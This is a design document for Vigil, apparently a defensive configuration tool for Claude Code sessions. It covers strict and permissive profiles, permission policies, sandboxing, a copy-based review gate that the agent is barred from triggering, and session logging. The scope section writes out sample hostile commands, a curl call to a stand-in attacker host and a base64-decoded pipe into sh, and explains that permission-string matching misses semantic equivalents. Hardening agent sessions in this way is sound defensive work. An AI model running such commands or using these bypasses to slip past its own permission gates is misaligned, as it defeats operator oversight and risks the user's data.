# DESIGN.md

This document explains the design choices behind Vigil: what it is for, how it is structured, and why. For installation see `README.md`; for platform support see `COMPATIBILITY.md`; for the project's lifecycle stage see `LIFECYCLE.md`; for what the tool does and does not defend against see `THREAT_MODEL.md`.

## What this project is

A configuration baseline and deployment mechanism for Claude Code sessions. It ships three things:

1. Two profiles: a `default` that is safe by construction (plan mode, a hard deny list, session-logging hooks, baseline agents), and an opt-in `permissive` profile with a minimal profile-layer floor (only `rm`, `sudo`, `vigil-install-review` denied) so that a lighter policy like `yolo` can actually produce a lighter posture than the default profile's baseline would otherwise prevent.
2. A small set of permission policies (`strict`, `dev`, `yolo`) that can be selected per session to change how interruptive Claude's permission gates are.
3. An installer that copies the repo's profiles, policies, hooks, and shell aliases into `~/.config/vigil/` and `~/.claude/`.

## Problem being solved

Claude Code's out-of-box defaults prompt once per tool and then remember the answer within the session — suitable for trust-iteration workflows where the operator reviews after the fact. The harness ships no deny list and no sandbox. This tool adds a second baseline: dangerous command categories always deny, sandbox is on, and every action requires review in plan mode until the operator explicitly opts into a looser posture.

## Design principles

**Safe by default.** The default profile is strict. A user who installs this tool and does nothing else gets plan mode and a deny list covering `rm`, `sudo`, destructive git, network fetchers, and language runtimes. Loosening is an explicit per-session act, never implicit.

**Copy over symlink.** The installer copies repo content into `~/.config/vigil/`. Edits to the source repo — including edits Claude itself makes — do not affect running sessions until the developer re-runs the installer. The copy step is a review checkpoint.

The copy firewall depends on a second rule: Claude never runs `install.sh`. An agent that could modify source and then trigger installation would collapse the review gate. This rule appears in every project's `CLAUDE.md` and is the reason the installer has no automation hook.

**Profile and policy are separate concerns.** A profile is identity: sandbox mode, hooks, baseline deny list, agent roster. A policy is posture: how permissive the session should be for the work at hand. Profiles are rarely switched; policies are selected per session. Keeping them orthogonal means posture can change (dev vs. strict vs. yolo) without reasoning about hooks, and hooks can change without affecting per-session permission behavior.

**Small surface.** No plugins, no extension points, no runtime configuration protocol. The tool is a set of JSON files, shell scripts, and markdown docs. If you need a feature, write it directly.

**Layered defense, honest claims.** Protections come from three layers: permission-string matching (catches deliberate invocations, defeatable via semantic equivalents), OS-level sandboxing (Claude Code's [sandbox runtime](https://code.claude.com/docs/en/sandboxing), configured via the `sandbox` block in `settings.json`; catches subprocess-level reads, writes, and network — not defeatable by allowed shell builtins), and Claude Code's built-in protections. The sandbox is load-bearing for the prompt-injection threat at the *subprocess* level; Claude Code's own in-process tools (Read, Write, Edit) execute outside the sandbox and rely on the permission layer alone. The permission layer is for operator clarity, casual-damage prevention, and protection of the in-process tool channel. `THREAT_MODEL.md` enumerates exactly which adversary models each layer addresses and which are out of scope, so the user can calibrate trust against auditable promises rather than an implicit "safe" label.

## Profile and policy in detail

### Profile

A profile directory contains:

- `settings.json` — static, host-independent configuration: sandbox mode and the non-path-dependent baseline deny list. Installed verbatim; identical in the repo and on the target machine.
- `settings.local.template.json` — host-local permission-layer denies for paths that the in-process Write/Edit/MultiEdit tools could otherwise reach (Vigil's own config, shell rc files, `.gitconfig`, and other enforcement-surface files). Sandbox-layer enforcement for credential reads is a separate concern, handled by `MASTER_DENY_READ`/`MASTER_DENY_WRITE` in `scripts/filter-sandbox-denies.py`. Processed through the standard `{{HOME}}`/`{{PROFILE_DIR}}` substitution pass at install time and written as `settings.local.json`. Claude Code unions the `deny` arrays from both files at session start.
- `CLAUDE.md` — instructions for Claude in every session under this profile. Covers commit discipline, agent-gate workflow, operational notes.
- Hook wiring (inside `settings.json`'s `hooks` block) — bare `vigil-hook <subcommand>` invocations dispatched through the sudo-installed `/usr/local/bin/vigil-hook` Python binary. The profile bundle does not contain hook scripts of its own. See the project `CLAUDE.md` for the dispatcher subcommand list.
- `agents/*.md` — specialist agent definitions (`architect`, `code-reviewer`) available in every session.

Two profiles ship today: `default` (the safe-by-construction baseline) and `permissive` (the lighter floor described above). Each is installed as a real bundle directory under `~/.config/vigil/profiles/`, and the active profile is additionally rendered into `~/.claude/` where Claude Code reads it. The active profile — what new sessions read by default — is selected by `vigil set-default <profile>`, which copies the chosen bundle's contents into `~/.claude/` and then records the choice in `~/.config/vigil/active-profile` via an atomic temp-file rename. Because both bundles persist as canonical copies, swaps are lossless in either direction. Per-session override is also available via the `CLAUDE_CONFIG_DIR` environment variable, pointing at any bundle under `~/.config/vigil/profiles/`. The layout supports additional user-authored profiles alongside the two shipped.

### Policy

A policy is a JSON fragment consumed via `claude --settings <policy-path>`. It overlays the profile's permissions; it does not touch sandbox or hooks.

Three policies ship:

- **`strict`** — matches the default profile's baseline. Plan mode, deny list as-is.
- **`dev`** — `acceptEdits` mode with an allow list for routine dev work (read-only git, build and test runners for common languages). Ask-gates history-rewriting operations (`git commit --amend`, `git stash`) and filesystem metadata changes (`chmod`, `chown`, `mv`). Retains the deny baseline. Explicitly protects `.git/` and `.claude/` from writes.
- **`yolo`** — `bypassPermissions` mode with only `rm` and `sudo` in the deny list. For flow; the two bright-line catastrophe guards remain.

### Why strict is default

The secure posture should be the default and the easy path. Elevation — switching to `dev` or `yolo` — is a deliberate per-session choice, the way `sudo` is a deliberate per-command choice. A user who hits a permission block reconsiders whether the action is one they actually wanted; that pause is the feature, not the friction. If elevation is frequent for a given workflow, invoking `vigil-dev` (or `claude --settings …`) for that session restores the flow. The inverse — permissive by default, tighten when something goes wrong — means discovering the posture mismatch after damage is already done. The `permissive` profile is shipped as an opt-in alternative for users whose workflow consistently outgrows the default's friction, but the swap is an explicit `vigil set-default permissive` — never automatic — preserving the same "elevation is deliberate" property.

### Why permissive ships as an opt-in alternative

Claude Code's permission-layer semantics — deny beats allow, order-insensitive — mean policies layered on top of the default profile can only add restrictions, not remove them. `dev` and `yolo` are meaningful as "add restrictions on top of an already-strict baseline," but they cannot loosen the baseline a developer is starting from. A developer who wants less friction than the default profile imposes has no supported path within Claude Code's permission model.

The `permissive` profile resolves this by lowering the profile-layer floor to just `rm`, `sudo`, and `vigil-install-review` (plus the Write/Edit/MultiEdit denies in `settings.local.json` that protect the session's enforcement-surface files — Vigil's config, shell rc files, `.gitconfig` — which are not posture choices). Within the permissive profile, `dev` and `yolo` express genuinely different postures because the policy's deny list and mode settings together determine session behavior, without the default profile's heavy baseline preempting them. The `strict` policy still serves both profiles: under default it's redundant overlay with the profile's denies; under permissive it reconstructs the heavy baseline on top of the lighter floor.

The wrappers map to this two-profile model as follows:

| | Default profile | Permissive profile |
|---|---|---|
| `vigil` / `vigil-strict` | profile's full deny list (the strict policy is redundant overlay) | permissive floor + strict policy → ≈ default-profile behavior |
| `vigil-dev` | profile's full deny list dominates; `dev`'s allows are dead rules | permissive floor + dev policy → real dev posture |
| `vigil-yolo` | profile's full deny list dominates; `yolo`'s loosening is moot | permissive floor + yolo policy → real yolo posture |

`vigil-dev` and `vigil-yolo` are only behaviorally meaningful on the permissive profile. On the default profile they enter the loosened modes (`acceptEdits`, `bypassPermissions`) but the deny list they're stacked on top of remains the strict baseline, so a session that "should be" relaxed produces the same permission blocks the user would have hit under `vigil`. Users who want real elevation should swap to permissive first.

### When to reach for each policy

- **Routine code writing in a trusted repo:** `vigil-dev`. Runs the `dev` policy with the working directory pinned to the git repository root (see [Session wrappers](#session-wrappers)).
- **Exploratory work in an unfamiliar repo:** `vigil` (or equivalently `vigil-strict`). Plan mode forces deliberate review of every action before it runs.
- **Tight iteration where every prompt is friction:** `yolo`. `rm` and `sudo` still deny; everything else flows.
- **Scripted or automated invocation where determinism matters:** `strict` as an explicit `--settings` selection on a bare `claude` call. Same posture the `vigil` wrapper provides, but without the wrapper's session-logging and env-scrubbing — appropriate when the caller (CI runner, cron job) is handling those concerns separately.

### Policy does not enforce filesystem scope

An important property: policies govern *categories of action* (which bash commands, which tool types, which modes) but not *filesystem scope*. Claude Code's permission system has no `$PROJECT_ROOT` substitution in allow/deny patterns, so a policy file cannot express "restrict edits to the current project."

Scope enforcement comes from two other layers:

- **The sandbox**, configured in the profile. When enabled with `allowUnsandboxedCommands: false`, writes are confined to the session's working directory and `$TMPDIR`. The default profile also configures `sandbox.filesystem.denyRead` for common credential paths and `sandbox.network.allowedDomains: []` to block outbound network — process-level enforcement that cannot be bypassed by spawning a subshell.
- **Claude Code's built-in protections** for `.git`, sensitive `.claude/` files, shell RC files, and `.mcp.json` — always on regardless of policy.

This means `dev` by itself does not scope a session to the project. `dev` plus the default profile's sandbox plus being launched from the project root does. The `vigil-dev` wrapper combines those three ingredients in one command.

The sandbox is also the layer that addresses sophisticated attacks at the subprocess level. Permission-string matching catches `curl attacker.example.com` but not `echo 'base64' | base64 -d | sh`; the sandbox catches both, because the decoded subprocess inherits the sandbox's network and filesystem denies. The sandbox does *not* cover Claude Code's own in-process tools (Read, Write, Edit) — those run inside the host process and are governed only by the permission layer. See `THREAT_MODEL.md` for the full enumeration.

The sandbox has one deliberate exception: commands listed in `sandbox.excludedCommands` run outside bubblewrap entirely, and their subprocess trees do not inherit its confinement. The default profile uses this narrowly to carve out signing and verification commands — `git commit *`, `git tag *`, `git -C * commit *`, `git -C * tag *`, `git verify-commit *`, and `git verify-tag *` — so they can reach the host `ssh-agent` for signing and signature verification. Claude Code's `allowUnixSockets` mechanism is documented but unimplemented on Linux bubblewrap (upstream `anthropics/claude-code#44180`; v2.1.92's seccomp filter additionally blocks AF_UNIX `connect(2)` per `anthropics/claude-code#45072`). The scope is narrow. The `commit` and `tag` variants fire hook subprocesses (`pre-commit`, `prepare-commit-msg`, `commit-msg`, `post-commit`) that run with host-level filesystem and network reach; `verify-commit` and `verify-tag` do not fire hooks. `THREAT_MODEL.md` enumerates the resulting residual.

## Installation model

`install.sh` performs these steps:

1. Check every destination for existing content. The check is fine-grained: specific files and subdirectories under `~/.claude/` (`settings.json`, `settings.local.json`, `settings.local.template.json`, `CLAUDE.md`, `hooks`, `agents`, `default.zip`) — not `~/.claude/` itself, which is shared with Claude Code's runtime state — plus the Vigil-owned paths under `~/.config/vigil/` (`vigil-aliases.sh`, `doctor.sh`, `pyszz.yml`, `profiles/default`, `profiles/permissive`, `scripts`, and each `policies/<name>.json`). If any already exists, the installer prints the conflicting paths to stderr and exits non-zero. There is no `--force` flag.
2. Copy `vigil-aliases.sh` to `~/.config/vigil/vigil-aliases.sh`.
3. For each policy file, substitute `{{HOME}}` with the user's home directory and write to `~/.config/vigil/policies/<name>.json`. Non-template policy files (`yolo.json`) are copied verbatim.
4. Copy management scripts to `~/.config/vigil/scripts/` and make them executable.
5. Copy each profile bundle into its install location. The default profile is copied to two destinations — the bundle at `~/.config/vigil/profiles/default/` (the canonical source `vigil set-default` reads from) and a rendered copy at `~/.claude/` (what Claude Code loads). The permissive profile is copied only to `~/.config/vigil/profiles/permissive/`. For each destination, copy `settings.json` verbatim, process `settings.local.template.json` through the standard `{{HOME}}`/`{{PROFILE_DIR}}` substitution pass, and write the result as `settings.local.json`.
6. Set the executable bit on the management scripts and review-gate hook templates copied in step 4.
7. Run `scripts/filter-sandbox-denies.py` against each profile's generated `settings.json` — default at both `~/.claude/settings.json` and `~/.config/vigil/profiles/default/settings.json`, permissive at `~/.config/vigil/profiles/permissive/settings.json` — to drop any `sandbox.filesystem.denyRead` entry that is a symlink, missing, or the wrong type. Bubblewrap fails closed if any denyRead entry cannot be mounted over; this filter prevents a confusing "every Bash subprocess fails" failure mode. The default-profile bundle is filtered too so a session that loads it directly via `CLAUDE_CONFIG_DIR` gets the same sandbox posture as one that loads `~/.claude`.
8. Print a reminder to source `vigil-aliases.sh` from the user's shell rc.

The installer is deliberately simple: check, copy, substitute, filter. No dependency installation, no service registration, no shell-rc editing. Every path it touches is owned by the user; no `sudo` is required.

The session wrappers in `vigil-aliases.sh` re-run `filter-sandbox-denies.py` on every launch, so a system change between sessions (a credential path becoming a symlink, a directory replaced by a file, or a path disappearing) cannot silently degrade the sandbox into "fails closed for every subprocess." The filter is silent on success and tolerant of missing dependencies (`python3` absent or the script not yet installed).

### Why refuse rather than overwrite

Vigil installs into `~/.claude/`, Claude Code's own configuration directory. Three of the files Vigil writes there — `settings.json`, `CLAUDE.md`, and `agents/` — are native Claude Code configuration paths that the user may have already created or customized independently of Vigil. A fourth, `settings.local.json`, is also a native Claude Code config path; Vigil generates it from a co-located `settings.local.template.json` (a Vigil-managed source artifact retained on the system so `vigil set-default` can regenerate `settings.local.json` after a profile swap). Automatic overwrite-on-reinstall would silently replace customizations to any of these. The same directory also contains Claude Code's runtime state — credentials (`.credentials.json`), session history (`history.jsonl`, `sessions/`), file edit history (`file-history/`), cache, and per-project state — which `install.sh` never writes into but a heuristic "wipe and reinstall" alternative could.

The installer declines to distinguish "files we own" from "Claude Code's runtime state" heuristically, because heuristics here have a failure mode where the installer silently deletes something valuable. Refusing to run when conflicts exist forces the operator to inspect the state explicitly and move anything worth keeping before proceeding.

## Session wrappers

`vigil-aliases.sh` defines four shell functions, all using `script(1)` to log the session. The bare `claude` command is no longer wrapped — it falls through to the upstream Claude Code binary unchanged, preserving a name for invocations that should escape Vigil's session logging and env scrubbing.

- **`vigil`** — session with the `strict` policy applied. The strict policy is always passed so the operator gets a known posture regardless of which profile is active.
- **`vigil-strict`** — equivalent to `vigil`. Exists for naming symmetry with `vigil-dev` and `vigil-yolo` so every shipped policy has a matching wrapper.
- **`vigil-dev`** — session with the `dev` policy and the working directory pinned to the current git repository's root. The `cd` runs in a subshell so the caller's working directory is not disturbed. If the current directory is not inside a git repo, `vigil-dev` falls back to the current directory.
- **`vigil-yolo`** — session with the `yolo` policy applied. Bypasses confirmations; retains `rm` and `sudo` denies.

`vigil-dev` exists because `dev` alone does not scope a session to the project (see [Policy does not enforce filesystem scope](#policy-does-not-enforce-filesystem-scope)). Combining the `dev` policy with a project-root working directory gives the sandbox a scope to enforce, producing a permissive-but-contained session in one command.

## Session logging

### Why this exists

Claude Code does not give the user direct access to their own conversation history as readable files. Sessions can be resumed inside Claude Code, and the terminal has scrollback while a session is open, but there is no documented place to grep your past prompts or pull a transcript out for archival, citation, or sharing without copy-pasting the rendered TUI by hand. This tool exists to close that gap.

The goal is *user-owned, readable conversation history*. Anything else (debugging payloads, structured tool data, integration with external log aggregators) is out of scope.

### How it works

Both session wrappers pipe Claude through `script(1)`, which captures every byte the TUI writes. The wrapper branches on `uname` for platform-correct `script(1)` flags (BSD and util-linux differ).

Each session produces two files under `~/vigil-logs/`:

- `session-<timestamp>-<repo>-<branch>.txt` — ANSI-stripped transcript, prepended with a `# vigil-policy: <name>` header. This is what `vigil-log` and `vigil-review` read.
- `session-<timestamp>-<repo>-<branch>.json` — sidecar metadata: `cwd`, `git_branch`, `git_head`, `active_policy`, `started_at`, and `ccusage_jsonl` (path to the most recently modified Claude Code JSONL usage file, for token-cost attribution).

The raw `script(1)` `.log` is discarded after the strip succeeds; on failure it is kept and no `.txt` is produced (the `.json` sidecar is still written). Sessions outside a git repo or in detached HEAD fall back to a timestamp-only filename (`session-<timestamp>.{txt,json}`).

The post-processing runs in the shell wrapper rather than as a Claude Code hook because hooks run inside the sandbox which previously scrubbed env vars set by the wrapper. Hooks now read session context from `~/.config/vigil/.vigil-session` (see below); per-tool-call logging and the memory-write gate use this pattern.

## Recurring failure patterns

Patterns that have caused multiple bugs in this repo's history. Captured here so future contributors recognize the shape faster — not a checklist to run before every change.

**Schema not verified at refactor time.** When a refactor renames or moves a field — in the sidecar JSON shape, the JSONL schema, or settings keys — downstream consumers (`scripts/join-sessions.py`, the sidecar reader in `vigil-aliases.sh`, `tests/semantics.py`) tend to degrade silently rather than fail loudly: a `.get(key)` default produces a missing-but-not-erroring record, and the failure surfaces only when a report or join looks empty. The pattern is to change the producer and trust the consumers will notice; they often do not. Watch for: any rename in a record shape that crosses a script boundary, especially when consumers read with `.get(key)` defaults.

**`set -e` plus `[[ ... ]] &&` idiom.** A line of the form `[[ -f "$x" ]] && do_something` reads as a no-op when the test is false, but actually returns non-zero — which under `errexit` aborts the whole script. The fix is `if [[ -f "$x" ]]; then do_something; fi`. The `&&` form is shorter and looks idiomatic, which is why it recurs. Watch for: any hook or shell wrapper that needs to no-op when a precondition is absent.

**Stale mental model of installed layout versus repo layout.** Edits think in repo terms (the source under `profiles/default/`, `scripts/`) but the runtime resolves against the installed copy: `settings.json` hooks call `vigil-hook` on `PATH` (sudo-installed at `/usr/local/bin/vigil-hook`), and the dispatcher reads helper scripts from `~/.config/vigil/scripts/`. Fixes that work in tests can fail at runtime when the executing path doesn't match post-`install.sh` reality, and vice versa. Watch for: any change that touches a hook command name, a `{{PROFILE_DIR}}` substitution, or a script invocation by absolute path.

**Tests tracking implementation rather than threat model.** A test that asserts on the exact bytes of `settings.json` passes whenever the bytes happen to match — even when the effective permission decision has regressed. A test that exercises the actual deny outcome catches the regression. The first form is easier to write and more brittle; the second is what protects the security claim. Watch for: tests that compare JSON shape rather than evaluate the harness's effective behavior.

## Non-goals

The tool deliberately does not:

- **Manage credentials.** Claude Code authentication, API keys, and OAuth tokens live in Claude Code's own configuration, outside this repo's scope.
- **Target Windows natively.** Windows users run under WSL. Native cmd/PowerShell support is not planned.
- **Provide a config DSL or macro language.** If JSON is too awkward for a use case, the answer is a new policy file, not a template system.
- **Solve team configuration.** Every install is single-user. Team-wide policy distribution is out of scope.
- **Replace Claude Code's own permission system.** The tool composes with the harness's permissions machinery; it does not reimplement it.
